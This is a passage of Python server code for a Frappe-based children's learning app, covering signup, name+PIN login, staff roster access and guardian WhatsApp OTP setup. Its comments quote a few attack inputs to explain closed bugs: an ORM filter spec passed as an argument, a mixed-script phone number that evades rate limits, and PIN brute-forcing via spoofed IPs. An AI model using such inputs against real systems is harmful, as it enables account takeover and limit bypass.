    band exists, and creates nothing.

    VALIDATION IS SEPARATE FROM INSERTION on purpose, and the split is what lets
    signup_with_consent check the form BEFORE it burns the guardian's one-time ticket. With
    the two fused, a girl who typed a 3-digit PIN got her payload rejected AND her ticket
    spent, so a guardian standing next to her had to request a whole new code over WhatsApp
    to fix a typo. The frontend disables the button until the fields are valid, so this was
    reachable mainly by a crafted call or a mid-submit hiccup — but "fumbling the PIN box
    costs you another SMS" is exactly the kind of cruelty a low-literacy audience should not
    have to discover.

    Extracted so the two self-signup doors — signup_student (tickbox consent) and
    signup_with_consent (a guardian's number proven by a code) — cannot drift apart on what a
    legal name, PIN, avatar, age or band is. They had every reason to drift: the rules here are
    the accumulated answer to several proven bugs, and duplicating them would mean the newer
    door quietly missing one. Every check below is verbatim from the original, in the same
    order, and the error codes are unchanged because the game switches on them.

    A name can't carry markup OR open a spreadsheet formula: it is denormalised onto every row
    a facilitator sees in Desk and exported to XLSX from the attendance report (see
    _display_name). Only the formula lead is dropped — her actual name is stored as typed.

    _docname on pin/band: scalars only (see _docname). A JSON body can send the PIN as a
    NUMBER, and .strip() on an int used to be a 500; a dict band would reach
    frappe.db.exists as a FILTER and "pass" the existence check as some other row.

    gender is NOT demographics-for-its-own-sake and is not optional theatre: Hindi verbs and
    adjectives agree with their subject, so the app literally cannot address a boy correctly
    without it (see gform() in the game). Anything that is not Female/Male — including the
    learner declining to say — lands on "Other", which the game resolves to the feminine forms
    this programme was written in. That is why the field was already hardcoded to "Other" here.

    The PIN is hashed here rather than at insert time so that no caller of this function ever
    holds a plaintext PIN in a structure it might log. That means an unauthorised caller can
    spend one pbkdf2 per attempt, which the per-IP signup ceiling (60/hour) already bounds to
    the point of irrelevance."""
    name = _display_name(name)
    if not (2 <= len(name) <= 40):
        return None, "bad_name"
    pin = _docname(pin, 16)
    if not (pin.isdigit() and 4 <= len(pin) <= 8):   # PIN REQUIRED (4–8 digits) — no PIN-less profiles
        return None, "bad_pin"
    avatar = _plain_text(avatar)[:20] or "🙂"        # an emoji, but nothing stops a crafted call;
    a = _int(age, None)                              # ZWJ-compound emoji survive (see _KEEP_FORMAT)
    band = _docname(band)
    g = _plain_text(gender)
    mas = _plain_text(mascot).lower()
    return {
        "doctype": "Student", "student_name": name, "avatar": avatar,   # both normalised above
        "login_pin": _hash_pin(pin), "active": 1,
        "gender": g if g in GENDERS else "Other",
        "mascot": mas if mas in MASCOT_IDS else "roshni",
        "age": a if (a is not None and 3 <= a <= 25) else None,
        "band": band if (band and frappe.db.exists("Grade Band", band)) else None,
    }, None


def _insert_self_signup_student(fields, cohort=None):
    """Insert an already-validated profile into the self-signup cohort. Returns the doc.

    Kept apart from validation so the only thing between a redeemed ticket and a created row
    is the insert itself — nothing that can fail on user input, and so nothing that can leave
    a guardian's spent ticket with no profile to show for it."""
    cohort = _docname(cohort)
    if not cohort:
        cohort = "Online"                                  # self-signups are the online cohort
        if not frappe.db.exists("Cohort", cohort):
            try:
                frappe.get_doc({"doctype": "Cohort", "cohort_name": cohort, "mode": "Online",
                                "center": "Self sign-up"}).insert(ignore_permissions=True)
            except frappe.DuplicateEntryError:             # concurrent first signups — fine
                pass
    # mode is set EXPLICITLY rather than left to the Student doctype's default: this door
    # is, by definition, the online one. Relying on the field default is what put
    # every Play Store tester in the "Campus" bucket while their cohort said Online.
    return frappe.get_doc(dict(fields, cohort=cohort, mode="Online")).insert(ignore_permissions=True)


def _create_self_signup_student(name, avatar, pin, age, band, cohort=None,
                                gender=None, mascot=None):
    """Validate then insert, for callers with nothing to do in between."""
    fields, err = _validated_profile_fields(name, avatar, pin, age, band, gender, mascot)
    if err:
        return None, err
    return _insert_self_signup_student(fields, cohort), None


@frappe.whitelist(allow_guest=True)
def signup_student(name=None, avatar=None, pin=None, age=None, cohort=None, band=None,
                   gender=None, mascot=None):
    """Self-service signup: a learner creates their own profile and is logged straight in.
    No email/password — just a name (+ optional avatar, PIN, grade band). Rate-limited per IP.

    REFUSED OUTRIGHT while guardian verification is switched on, because otherwise this is a
    way around it. The game decides which screen to show from `SETTINGS.otpEnabled &&
    backendLive`, and `backendLive` is a boot-time latch: a device that booted with no signal
    (or whose first API call lost a race) keeps cached settings but a false latch, so it shows
    the OLD child-ticked box — and then reaches a server that IS up and creates a real, fully
    synced Student with no parental consent behind it. Which is precisely the thing the gate
    exists to prevent, so the ceiling cannot live in the client. A profile made with no server
    at all is unaffected and still allowed: it stays on the device (`local: true`), transmits
    nothing, and so processes no personal data for anyone to consent to."""
    if _otp_config():
        return {"ok": False, "error": "otp_required"}
    if not _rate_ok("signup:" + _client_ip(), 60, 3600, fail_closed=True):
        # generous for a classroom; stops spam faucets. fail_closed: signup is PRE-AUTH and
        # mints a Student row + a 90-day token, so an uncapped faucet is the destructive case —
        # if the limiter is unavailable, refuse new profiles rather than run without a ceiling.
        # Existing learners are unaffected: every lesson path stays fail-open.
        return {"ok": False, "error": "rate_limited"}
    doc, err = _create_self_signup_student(name, avatar, pin, age, band, cohort, gender, mascot)
    if err:
        return {"ok": False, "error": err}
    token = _token_for(doc.name)
    frappe.db.commit()
    return {"ok": True, "id": doc.name, "name": doc.student_name,
            "avatar": doc.avatar or "🙂", "hasPin": bool(pin), "token": token, "band": band or "",
            "gender": doc.gender or "", "mascot": doc.mascot or "roshni"}


def _login_name_candidates(key):
    """Active students that `key` (a _login_name_key) is allowed to authenticate against, in
    the order to try them.

    THE SQL IS ONLY A PREFILTER. The authoritative test is that the row's OWN stored name
    canonicalises back to the same key, applied here in Python — which is what makes the
    bucket key and the lookup agree BY CONSTRUCTION rather than by my guessing MariaDB's
    collation table correctly. A spelling this function rejects cannot authenticate, so it
    cannot own a separate budget; and a spelling it accepts has, by definition, the same
    _login_name_key and therefore the same bucket. It also stops the collation's own
    over-matching from logging one girl into another girl's profile (proven: 'अंजू' + PIN
    returned the row of a different girl, 'अजू', because the DB gives U+0902 zero weight).

    Two passes, lazily, so an ordinary login stays an INDEXED equality lookup:
      1. `student_name = key`, indexed (Student.student_name search_index) and, under
         utf8mb4_unicode_ci, already case- and zero-width-insensitive. Every name stored
         through signup is found here, because _display_name is _login_name_key minus exactly
         the folding the collation does for us.
      2. reached only when nothing in pass 1 matched the PIN: the same lookup with ASCII
         spaces removed on BOTH sides. This finds a facilitator-created (Desk) row whose name
         holds an internal double space or a leading space — the collation treats those as
         significant, so pass 1 cannot see her and she could otherwise never log in at all.
         Unindexed, but it only runs on a login that has already failed, and the per-account
         budget bounds how often that can happen.
    The PIN is checked by the caller, so pbkdf2 is spent only on rows whose NAME really
    matches — a name the DB over-matches to fifty rows no longer costs fifty hashes."""
    fields = ["name", "student_name", "login_pin", "avatar", "band", "gender", "mascot"]
    seen = set()
    for r in frappe.get_all("Student", filters={"active": 1, "student_name": key}, fields=fields):
        if _login_name_key(r.student_name) == key:
            seen.add(r.name)
            yield r
    for r in frappe.db.sql("select `name`, student_name, login_pin, avatar, band, gender, mascot "
                           "from `tabStudent` where active = 1 "
                           "and replace(student_name, ' ', '') = %s",
                           (key.replace(" ", ""),), as_dict=True):
        if r.name not in seen and _login_name_key(r.student_name) == key:
            yield r


@frappe.whitelist(allow_guest=True)
def login_by_name(name, pin=None):
    """Log in by typing your name + PIN — NO roster is shown (cleaner, and doesn't broadcast
    minors' names). The PIN disambiguates if a name repeats. Generic error (never reveals
    whether a name exists). Locked out PER NAME — never per IP.

    The lockout key used to include _client_ip(), which made it worthless: eight wrong PINs
    from eight different X-Forwarded-For values never tripped it, so the 4-digit PIN behind
    this endpoint was brute-forceable (proven over HTTP). Replacing the IP with the typed name
    was still not enough, because the key was byte-exact while the lookup it guards is not:
    see _login_name_key for the re-spelling bypass that closed, and for the girl with a double
    space in her name whom the same normalisation lets back in. See the PIN LOCKOUT note above
    for what a per-account lockout costs and how a facilitator releases it."""
    # _login_name_key starts with _docname, not .strip(): a whitelisted argument arrives as
    # parsed JSON, so `name` can be a dict or list. `(name or "").strip()` was an
    # AttributeError → HTTP 500 on any container, and a container reaching the get_all filter
    # would be an ORM operator spec (["like", "%"]) rather than a name.
    key = _login_name_key(name)
    if not key:
        return {"ok": False, "error": "bad_login"}
    acct = _login_account_key("nm", key)
    if _login_blocked(acct):
        return {"ok": False, "error": "locked"}
    match = next((s for s in _login_name_candidates(key) if _pin_ok(s.login_pin, pin)), None)
    if not match:
        _login_failed(acct)
        return {"ok": False, "error": "bad_login"}
    _login_succeeded(acct)
    if match.login_pin and not _looks_hashed(match.login_pin):
        frappe.db.set_value("Student", match.name, "login_pin", _hash_pin(str(match.login_pin)), update_modified=False)
    token = _token_for(match.name)
    frappe.db.commit()
    return {"ok": True, "id": match.name, "name": match.student_name, "avatar": match.avatar or "🙂",
            "token": token, "band": match.band or "",
            "gender": match.gender or "", "mascot": match.mascot or "roshni"}


# ---------------------------------------------------------------------------
# Online enrolment — a remote learner self-registers with a per-cohort INVITE CODE.
# Online students are real Frappe Website Users (username + PIN, synthetic no-email
# address, login-by-username) paired 1:1 with a Student record that holds their
# progress. Campus students never come through here (they're facilitator-created).
# ---------------------------------------------------------------------------
_ONLINE_EMAIL_DOMAIN = "students.hikmat.invalid"   # RFC-2606 non-routable → no mail ever leaves
_USERNAME_RE = re.compile(r"^[a-z0-9][a-z0-9._-]{2,29}$")


def _create_online_user(username, pin, full_name):
    """Create a login-only Website User: username + PIN (as the password), a synthetic
    non-routable email, no welcome mail, no Desk. Password policy is disabled site-wide
    for these PIN-based accounts (see patch v2_online_auth); staff rely on 2FA."""
    user = frappe.get_doc({
        "doctype": "User", "email": username + "@" + _ONLINE_EMAIL_DOMAIN,
        "first_name": full_name or username, "username": username,
        "user_type": "Website User", "send_welcome_email": 0, "enabled": 1,
        "new_password": pin,
    })
    user.flags.no_welcome_mail = True
    user.flags.ignore_password_policy = True
    user.insert(ignore_permissions=True)
    return user


@frappe.whitelist(allow_guest=True)
def signup_online(username=None, pin=None, invite_code=None, name=None, avatar=None, band=None,
                  gender=None, mascot=None):
    """Self-service ONLINE signup gated by a cohort invite code. Creates a Website User +
    linked Student (mode=Online). Rate-limited per IP. Generic errors (no enumeration)."""
    if not _rate_ok("signup:" + _client_ip(), 60, 3600, fail_closed=True):   # see signup_student
        return {"ok": False, "error": "rate_limited"}
    username = _docname(username, 30).lower()    # scalars only (see _docname); the RE does the rest
    if not _USERNAME_RE.match(username):
        return {"ok": False, "error": "bad_username"}
    pin = _docname(pin, 16)                      # may arrive as a JSON number
    if not (pin.isdigit() and 4 <= len(pin) <= 8):
        return {"ok": False, "error": "bad_pin"}
    invite_code = _docname(invite_code, 60)      # a dict here would be an ORM FILTER, not a code
    cohort = frappe.db.get_value("Cohort", {"invite_code": invite_code}, "name") if invite_code else None
    if not cohort:
        return {"ok": False, "error": "bad_invite"}
    if frappe.db.exists("User", {"username": username}) \
            or frappe.db.exists("User", username + "@" + _ONLINE_EMAIL_DOMAIN):
        return {"ok": False, "error": "username_taken"}
    # Same guard as signup_student: no markup, no spreadsheet-formula lead (see _display_name).
    # The username has already passed _USERNAME_RE, so the fallback is always safe.
    name = _display_name(name) or username
    avatar = _plain_text(avatar)[:20] or "🙂"
    band = _docname(band)
    band = band if (band and frappe.db.exists("Grade Band", band)) else None
    # Same whitelists as _validated_profile_fields — this door builds its Student row by hand
    # (it also has to mint the User), so the two must not drift on what a gender or a guide is.
    g = _plain_text(gender)
    g = g if g in GENDERS else "Other"
    mas = _plain_text(mascot).lower()
    mas = mas if mas in MASCOT_IDS else "roshni"

    user = _create_online_user(username, pin, name)
    stu = frappe.get_doc({
        "doctype": "Student", "student_name": name, "avatar": avatar,   # both normalised above
        "cohort": cohort, "login_pin": _hash_pin(pin), "active": 1, "gender": g, "mascot": mas,
        "band": band, "mode": "Online", "user": user.name,
    }).insert(ignore_permissions=True)
    token = _token_for(stu.name)
    frappe.db.commit()
    return {"ok": True, "id": stu.name, "name": name, "avatar": stu.avatar or "🙂",
            "token": token, "band": band or "", "gender": g, "mascot": mas,
            "username": username}


_EMAIL_RE = re.compile(r"^[^@\s]{1,64}@[A-Za-z0-9]([A-Za-z0-9.-]{0,251}[A-Za-z0-9])?\.[A-Za-z]{2,24}$")
_MIN_PASSWORD = 8

# The commonest passwords, refused outright. Not a security theatre list — these are what a
# rushed adult actually types, and this account is the only thing standing between a stranger
# and a child's learning record.
_WEAK_PASSWORDS = frozenset("""
password password1 password123 12345678 123456789 1234567890 qwerty123 qwertyui
iloveyou1 letmein1 welcome1 abc12345 admin123 bodhya123 hikmat123 changeme
""".split())


def _validated_password(pwd):
    """(password, None) or (None, error_code). Length first, then the obvious-guess list.

    Deliberately NOT delegating to Frappe's password policy: v2_online_auth switched that off
    site-wide so that 4-digit PINs could be stored as passwords. Turning it back on now would
    reject every existing PIN account at next login, so this door enforces its own floor and
    leaves the site setting alone."""
    pwd = pwd if isinstance(pwd, str) else ""
    if len(pwd) < _MIN_PASSWORD:
        return None, "weak_password"
    if pwd.strip().lower() in _WEAK_PASSWORDS:
        return None, "common_password"
    return pwd, None


def _normalised_email(value):
    e = _plain_text(value).strip().lower()
    return e if (len(e) <= 140 and _EMAIL_RE.match(e)) else ""


@frappe.whitelist(allow_guest=True)
def signup_email(email=None, password=None, name=None, avatar=None, band=None,
                 gender=None, mascot=None):
    """Open sign-up for ONLINE learners: a real email address and a real password.

    This is the door for people who find the app themselves, and it deliberately has no invite
    code — unlike signup_online, which gates on a cohort code because it enrols someone into a
    facilitator's cohort. It also has no PIN: a 4-digit PIN typed on a shared classroom laptop
    and a password protecting an internet-facing account are not the same security problem, and
    pretending otherwise is how the PIN ended up being stored as a User password.

    Creates a Website User (no Desk, no welcome mail) plus the linked Student, then answers
    ok. The CLIENT logs in afterwards through Frappe's own /api/method/login with the same
    address and password — one tested path for signing in, exercised from the first minute,
    rather than a bespoke session handed out here that only ever runs once.

    NOT verified by email. There is no outbound mail configured on this site, so a verification
    step would either block every signup or be a link nobody receives. The address is stored as
    given; treat it as a login identifier, not as proof of ownership, until mail is set up."""
    if not _rate_ok("signup:" + _client_ip(), 60, 3600, fail_closed=True):   # see signup_student
        return {"ok": False, "error": "rate_limited"}

    email = _normalised_email(email)
    if not email:
        return {"ok": False, "error": "bad_email"}
    password, err = _validated_password(password)
    if err:
        return {"ok": False, "error": err}

    display = _display_name(name) or email.split("@")[0]
    if not (2 <= len(display) <= 40):
        return {"ok": False, "error": "bad_name"}

    if frappe.db.exists("User", email):
        # Same wording as a wrong password would produce on the login screen, so this endpoint
        # is not a membership oracle for arbitrary addresses.
        return {"ok": False, "error": "email_taken"}

    avatar = _plain_text(avatar)[:20] or "🙂"
    band = _docname(band)
    band = band if (band and frappe.db.exists("Grade Band", band)) else None
    g = _plain_text(gender)
    g = g if g in GENDERS else "Other"
    mas = _plain_text(mascot).lower()
    mas = mas if mas in MASCOT_IDS else "roshni"

    user = frappe.get_doc({
        "doctype": "User", "email": email, "first_name": display,
        "user_type": "Website User", "send_welcome_email": 0, "enabled": 1,
        "new_password": password,
    })
    user.flags.no_welcome_mail = True
    user.insert(ignore_permissions=True)

    cohort = "Online"
    if not frappe.db.exists("Cohort", cohort):
        try:
            frappe.get_doc({"doctype": "Cohort", "cohort_name": cohort, "mode": "Online",
                            "center": "Self sign-up"}).insert(ignore_permissions=True)
        except frappe.DuplicateEntryError:
            pass

    stu = frappe.get_doc({
        "doctype": "Student", "student_name": display, "avatar": avatar,
        "cohort": cohort, "active": 1, "gender": g, "mascot": mas,
        "band": band, "mode": "Online", "user": user.name,
    }).insert(ignore_permissions=True)
    frappe.db.commit()
    return {"ok": True, "id": stu.name, "email": email, "name": display,
            "avatar": stu.avatar or "🙂", "band": band or "", "gender": g, "mascot": mas}


@frappe.whitelist(allow_guest=True)
def get_my_student():
    """After an ONLINE Frappe login (POST /api/method/login with the username + PIN), the game
    calls this over the same session to load the linked Student's profile + a bearer token —
    the client never needs to know the student id up front. Returns {ok:False} for a guest."""
    sid = _session_student()
    if not sid:
        return {"ok": False}
    s = frappe.db.get_value("Student", sid,
                            ["student_name", "avatar", "band", "gender", "mascot"], as_dict=True)
    return {"ok": True, "id": sid, "name": s.student_name, "avatar": s.avatar or "🙂",
            "band": s.band or "", "gender": s.gender or "", "mascot": s.mascot or "roshni",
            "token": _token_for(sid)}   # request-level commit persists the token


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def get_campus_roster(campus=None):
    """Provision a campus laptop for offline login: the active campus roster WITH each
    girl's PIN hash + bearer token, cached on-device so name+PIN can be verified locally
    during an offline stretch and attempts synced on reconnect. Staff only — it returns
    credentials for every girl on a campus, so it must never be reachable by a learner."""
    _require_staff()          # was an inline role check; same role, now the shared gate
    if not campus:
        return []
    rows = frappe.get_all("Student", filters={"active": 1, "mode": "Campus", "campus": campus},
                          fields=["name", "student_name", "avatar", "login_pin", "band",
                                  "gender", "mascot"],
                          order_by="student_name asc")
    out = [{"id": r.name, "name": r.student_name, "avatar": r.avatar or "🙂",
            "pinHash": r.login_pin or "", "token": _token_for(r.name), "band": r.band or "",
            "gender": r.gender or "", "mascot": r.mascot or "roshni"} for r in rows]
    frappe.db.commit()   # _token_for may have minted tokens
    return out


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def get_campuses():
    """Active campuses (name + location) — for the device-setup screen's campus picker.

    Staff only, and free of charge: the game calls this ONLY from renderDeviceSetup, after
    frappeLogin(teacher) has already succeeded, and its very next call is get_campus_roster
    — which has always required System Manager. So any session that could use the answer
    was already staff; a session that could not was reading the locations of centres full
    of girls for nothing. A refusal surfaces as the screen's existing "No campuses found."""
    _require_staff()
    return frappe.get_all("Campus", filters={"active": 1}, fields=["name", "location"],
                          order_by="campus_name asc")


# ---------------------------------------------------------------------------
# GUARDIAN PHONE VERIFICATION (a code over WhatsApp)
#
# WHOSE NUMBER, AND WHY IT IS NOT THE LEARNER'S. This app is a Designed-for-Families,
# child-directed app (see playstore/05-families-policy.md), and under India's DPDP Act 2023
# a "child" is anyone under 18 — which is essentially every learner here. So the number
# collected is the PARENT'S / GUARDIAN'S, never the girl's, for three reasons that all point
# the same way:
#   1. lawfulness. To collect a minor's phone number you first need verifiable parental
#      consent, so you need the guardian in the loop anyway; making the child's number the
#      identifier is circular, and it would put "phone number, collected from children" on
#      the Play Data Safety form of a Families app.
#   2. it is the consent mechanism we already owe. A code entered on the guardian's own
#      handset IS a recognised way to verify parental consent. The signup screen's old
#      tickbox ("a parent said it's okay") is an assertion by the child, not consent by the
#      parent. This closes that gap rather than adding a new obligation.
#   3. reality in Champaran. Most girls do not own the phone — it is a father's or a
#      brother's. Making the girl's number her login would lock her out the moment the
#      handset moves, and rural prepaid SIM churn would strand her permanently.
#
# WHY THIS IS NOT THE DAILY LOGIN. A code is required only to ENROL and to RECOVER a
# forgotten PIN. Day-to-day login stays name+PIN — verified ON-DEVICE against the cached
# roster hash on a campus laptop (see get_campus_roster / pbkdf2Verify in the game). That is
# not a convenience choice, it is the whole offline-first premise: an OTP-gated login would
# brick the app on every stretch without a signal. It also keeps the message volume at
# roughly one or two per learner per YEAR, so the paid channel costs paise, and it means a
# shared family handset is needed twice, not twice a day.
#
# WHAT IS STORED: NOTHING REVERSIBLE. No phone number is ever written to the database, not
# even encrypted. We keep an HMAC of it (see _mobile_hash) plus the last 4 digits so a
# facilitator can say "the number ending 3210?". Recovery still works because the person
# asking types the number again and we compare hashes — the plaintext exists only for the
# life of that one request. A database dump therefore yields no list of guardians' phone
# numbers, which is the DPDP data-minimisation answer and also the honest answer to "what
# happens if the server is breached". The code itself is stored as a pbkdf2 hash and is
# never logged, never put in an error message, and never written to an SMS/comm log — which
# is exactly why the WhatsApp send below does NOT go through frappe.core...sms_settings
# .send_sms: that helper writes the message BODY into an SMS Log row.
#
# ENUMERATION, AND THE TRADE-OFF TAKEN DELIBERATELY. For a Recovery request we send only if
# some verified guardian number matches, so a caller who probes numbers can learn "this
# number belongs to a family in the programme" by watching for a delivered message. The
# alternative — always claim to have sent — leaves a rural guardian staring at a phone that
# will never buzz, with no way to tell a wrong number from a slow one. Given the leak yields
# no account access and the audience cannot debug silence, the usable behaviour wins; it is
# priced down by the per-number and per-IP ceilings below. The response text is still
# uniform ("if that number is on file, a code is on its way"), so the ORACLE IS THE MESSAGE,
# NOT THE API — a remote attacker without the handset learns nothing from the reply.
# ---------------------------------------------------------------------------
_OTP_DIGITS = 6
_OTP_MAX_ATTEMPTS = 5             # wrong codes before the challenge voids
_OTP_RESEND_COOLDOWN = 60         # seconds between sends to one number
_OTP_PER_NUMBER_DAY = 5           # sends per number per 24h, PER PURPOSE
_OTP_PER_NUMBER_DAY_TOTAL = 8     # ...and across both purposes together
_OTP_PER_IP_HOUR = 20             # sends per source per hour
_OTP_VERIFY_PER_IP_HOUR = 60      # code guesses per source per hour
_OTP_RESET_PER_NUMBER_HOUR = 10   # PIN-reset attempts per guardian number per hour
_OTP_RESET_PER_IP_HOUR = 30       # ...and per source per hour
_TICKET_TTL_SECONDS = 900         # 15 min to finish the signup / reset after verifying
_OTP_KEEP_DAYS = 30               # then the challenge rows are pruned (storage limitation)

# The canonical consent wording lives HERE, server-side, and is what the game renders (it
# rides along in get_settings as consentText/consentTextHi). That direction matters for the
# audit trail: storing text the CLIENT sent would let a crafted call file whatever wording it
# liked as "what the guardian agreed to". Bump the version whenever the wording changes —
# consent to superseded wording is not consent to the new wording, which is why each
# Hikmat Consent row snapshots the text it was given rather than pointing at this constant.
_CONSENT_VERSION = "2026-08-20-v1"
_CONSENT_TEXT_EN = (
    "I am the parent or guardian of this child. I agree that she may use Bodhya Learn, and "
    "that her first name or nickname, her lesson answers and her stars are saved so her "
    "teacher can help her learn. I know this phone number is kept only to prove this "
    "permission and to reset her PIN if she forgets it, and that I can ask for her account "
    "and data to be deleted at any time."
)
_CONSENT_TEXT_HI = (
    "मैं इस बच्ची का माता-पिता या अभिभावक हूँ। मैं सहमति देता/देती हूँ कि वह बोध्या लर्न का उपयोग कर सकती है, और "
    "उसका पहला नाम या उपनाम, उसके पाठ के उत्तर और उसके सितारे सुरक्षित रखे जाएँ ताकि उसकी शिक्षिका उसकी मदद कर सके। "
    "मुझे पता है कि यह मोबाइल नंबर केवल इस अनुमति को प्रमाणित करने और पिन भूल जाने पर उसे बदलने के लिए रखा जाता है, "
    "और मैं कभी भी उसका खाता और डेटा हटाने के लिए कह सकता/सकती हूँ।"
)

# ASCII digits ONLY, spelled [0-9] rather than \d. In Python \d is UNICODE: it matches
# Devanagari ०-९, Arabic-Indic, Bengali and a dozen other decimal scripts, so `\d{9}` happily
# accepted "98765४3210" (a Devanagari 4 in the middle) as a valid number — see _norm_mobile
# for why that was the whole ceiling gone.
_MOBILE_RE = re.compile(r"^[6-9][0-9]{9}$")   # Indian mobile: 10 ASCII digits, leading 6-9


def _rate_room(bucket, limit):
    """True if `bucket` is under `limit`, WITHOUT consuming any of it. Fails CLOSED.

    Exists so a send budget can be checked BEFORE the message is attempted and charged only
    AFTER it is actually handed to the gateway. Charging up front (which is what _rate_ok
    does, since it INCRs to test) meant a misconfigured or throttling gateway burned a
    family's whole day of sends without delivering anything — and "the access token expired"
    is the single likeliest state of a real deployment months in, so that turned one bad
    credential into a 24-hour lockout for every family who tried."""
    try:
        return _rate_state(bucket)[0] < limit
    except Exception as e:
        _rl_warn(bucket, e, True)
        return False


def _norm_mobile(val):
    r"""A guardian's number as E.164 (+91XXXXXXXXXX), or "" if it is not a valid Indian
    mobile number.

    ONE canonical form is a security property, not tidiness: the number is the key for the
    per-number resend cooldown and daily ceiling, and it is what the stored HMAC is computed
    over. If "98765 43210", "+919876543210" and "09876543210" hashed differently, the same
    guardian would get a fresh send budget per spelling (the same class of bypass that
    _login_name_key exists to close) and a girl who recovered her PIN with one spelling
    could not recover it with another.

    People type numbers with spaces, dashes, brackets and a country code or a trunk 0, so
    all of those are accepted and folded. The length guards matter: `91` is stripped only
    from a 12-digit string, because 9123456789 is itself a perfectly good 10-digit number,
    and a leading `0` only from an 11-digit one.

    India-only, deliberately and narrowly: WhatsApp will happily accept a foreign number and
    charge a different rate for it, and every family in this programme is in India. A number
    we cannot reason about is refused rather than half-supported.

    NON-ASCII DIGITS ARE FOLDED, NOT DROPPED, and that is the same security property again.
    This used to strip with `[^\d]`, and Python's `\d` is UNICODE — it KEEPS Devanagari
    ०१२३४५६७८९ and every other decimal script — while `_MOBILE_RE` was `[6-9]\d{9}`, which
    ACCEPTED them. Measured: "98765४3210" (one Devanagari 4) passed both, so it normalised to a
    string different from "9876543210", hashed differently, and therefore
      * minted a FRESH resend cooldown and a fresh 5-a-day budget per spelling — with ~10
        interchangeable spellings per digit position that is the per-number ceiling gone,
        leaving only the per-IP one, which is exactly the "attacker varies something the
        victim cannot" bug this file has been broken by twice (see the PIN LOCKOUT note); and
      * silently broke recovery: a guardian who enrolled from a Devanagari keypad stored a
        hash that the ASCII spelling of her own number can never match, and the uniform
        "if that number is on file, a code is on its way" reply means she would never be
        told why no message ever came.
    Folding rather than rejecting is deliberate: a Hindi keyboard really can produce these,
    and unicodedata.digit maps each to the same ASCII value, so both spellings now reach ONE
    canonical form and ONE hash."""
    s = _docname(val, 24)                     # scalars only — a dict here reaches an ORM filter
    s = "".join(str(unicodedata.digit(ch)) for ch in s if ch.isdigit()
                and unicodedata.decimal(ch, None) is not None)
    if len(s) == 14 and s.startswith("0091"):
        s = s[4:]
    if len(s) == 12 and s.startswith("91"):
        s = s[2:]
    if len(s) == 11 and s.startswith("0"):
        s = s[1:]
    return "+91" + s if _MOBILE_RE.match(s) else ""


def _mobile_hash(e164):
    """Keyed HMAC of a normalised number — the only form of it that touches the database.

    HMAC, not a bare digest: an Indian mobile number has about 9 billion possibilities, so a
    plain sha256(number) column is a rainbow table someone can build on a laptop over lunch.
    The key is the SITE ENCRYPTION KEY, which lives in site_config.json and not in the
    database, so the hashes in a stolen dump cannot be reversed without also taking the
    filesystem.

    Consequence to know about: rotating the site encryption key orphans every hash here, and
    guardians would have to verify their number again (a PIN reset would stop matching until
    they do). That is the same blast radius rotation already has for every Password field in
    Frappe, so it is a property of the platform rather than a new trap — but it is the reason
    this is not silently re-derivable from something else."""
    from frappe.utils.password import get_encryption_key
    key = str(get_encryption_key() or "")
    return hmac.new(key.encode("utf-8"), e164.encode("utf-8"), hashlib.sha256).hexdigest()


def _otp_code():
    """A 6-digit code from the CSPRNG, leading zeros kept (it is a string, not a number).

    secrets, not random: `random` is a Mersenne Twister seeded from the clock, and a handful
    of observed codes let an attacker predict the next one — which for a code that authorises
    a PIN reset is the whole ballgame."""
    return "{:0{}d}".format(secrets.randbelow(10 ** _OTP_DIGITS), _OTP_DIGITS)


def _otp_config():
    """The OTP channel configuration, or None when the feature is switched off.

    Off is the DEFAULT and it is a real, supported state: a site with no WhatsApp credentials
    returns None here, every endpoint below answers `otp_off`, and the game falls back to the
    plain consent tickbox exactly as it behaved before this existed. Nothing half-configured
    can send.

    "Can it actually send?" is the whole question this answers, which is why it checks the
    TOKEN as well as the phone number id, and why Console counts as ready only where a Console
    code is actually handed back (_console_ok). The alternative — reporting the raw `otp_enabled`
    tickbox — put a consent gate in front of every new learner on a site that could not send:
    the gate appears, "Send the code" fails, and because the gate REPLACES the old tickbox
    there is no other way to enrol. A ticked box plus an expired token is the likeliest state
    of a real deployment six months in, so it has to degrade to the pre-existing path rather
    than to a dead end. get_settings publishes bool(_otp_config()) for the same reason."""
    s = frappe.get_cached_doc("Hikmat Settings")
    if not s.get("otp_enabled"):
        return None
    channel = (s.get("otp_channel") or "WhatsApp").strip()
    cfg = {
        "channel": "Console" if channel.startswith("Console") else "WhatsApp",
        "ttl": max(2, min(_int(s.get("otp_ttl_minutes"), 10) or 10, 60)),
        "template": (s.get("wa_template") or "hikmat_otp").strip(),
        "lang": (s.get("wa_lang") or "en").strip(),
        "phone_number_id": (s.get("wa_phone_number_id") or "").strip(),
        "api_version": (s.get("wa_api_version") or "v21.0").strip(),
        "send_button": bool(s.get("wa_send_button")),
        "button_subtype": (s.get("wa_button_subtype") or "url").strip(),
    }
    if cfg["channel"] == "WhatsApp" and not (cfg["phone_number_id"] and _wa_token()):
        return None                            # configured to send, but cannot: treat as off
    if cfg["channel"] == "Console" and not _console_ok():
        return None                            # Console on a real site would never reveal a code
    return cfg


def _wa_token():
    from frappe.utils.password import get_decrypted_password
    return get_decrypted_password("Hikmat Settings", "Hikmat Settings", "wa_token",
                                  raise_exception=False) or ""


def _send_otp_whatsapp(e164, code, cfg):
    """Hand one authentication-template message to Meta's Cloud API. Returns (ok, error).

    Called DIRECTLY (no BSP), which is why there is no platform fee to pay: Meta hosts the
    Cloud API and bills only per delivered message.

    Meta requires an authentication template to carry a copy-code or one-tap button, and when
    it does, the code has to be repeated in a BUTTON component as well as the body — sending
    only the body is rejected with a components mismatch. Both the presence of that button
    and its sub_type are Desk settings rather than constants, because the one thing that
    reliably differs between accounts is exactly how the approved template is shaped, and a
    mismatch should be a five-second edit rather than a deploy.

    Note what is NOT here: no expiry-minutes parameter. An authentication template's body
    takes a single variable (the code); its "expires in N minutes" line is configured on the
    template at approval time, not per send. Our own TTL is enforced server-side regardless.

    A timeout is mandatory, not defensive dressing: this runs inside the request that the
    guardian is waiting on, and a hung graph call would pin a gunicorn worker until the
    frontend gave up. The error text is truncated and, being Meta's own, never contains the
    code — the one thing that must not reach a log."""
    import requests
    token = _wa_token()
    if not token:
        return False, "no access token configured"
    url = "https://graph.facebook.com/{}/{}/messages".format(cfg["api_version"], cfg["phone_number_id"])
    components = [{"type": "body", "parameters": [{"type": "text", "text": code}]}]
    if cfg["send_button"]:
        components.append({"type": "button", "sub_type": cfg["button_subtype"], "index": "0",
